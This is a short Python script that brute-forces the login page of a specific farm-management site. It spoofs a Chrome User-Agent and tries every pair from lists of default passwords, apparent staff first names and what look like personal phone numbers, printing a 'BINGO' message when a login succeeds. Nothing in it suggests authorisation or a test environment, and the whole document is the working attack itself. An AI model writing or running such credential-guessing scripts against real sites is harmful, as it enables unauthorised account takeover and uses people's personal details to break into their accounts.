"""
Test credentials without following redirects to find the one that DOES NOT redirect to login/login.php
"""
import requests, sys
sys.stdout.reconfigure(encoding='utf-8')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
})

login_url = "https://sunfra.com/farm/sunfra/"

passwords_to_try = [
    "Kusum@2026Bb!", "admin123", "sunfra123", "sunfra", "admin", "123456", 
    "kusum2026", "Kusum@2026", "sunfra2026", "farm2026", "9493928388", "7259510983"
]
usernames_to_try = [
    "admin", "sunfra", "farm", "supervisor", "kusum", "poornima", 
    "yeswanth", "balaji", "prasad", "7259510983", "7975209680", "9493928388", "naveen"
]

for u in usernames_to_try:
    for p in passwords_to_try:
        data = {'username': u, 'password': p, 'remember_me': '1'}
        resp = session.post(login_url, data=data, allow_redirects=False)
        loc = resp.headers.get('Location', '')
        if loc and 'login/login.php' not in loc:
            print(f"🎉 BINGO! REAL LOGIN CREDENTIAL: username='{u}', password='{p}' -> Location: {loc}")
            sys.exit(0)

print("❌ None of the tested credentials redirected to a logged-in page.")

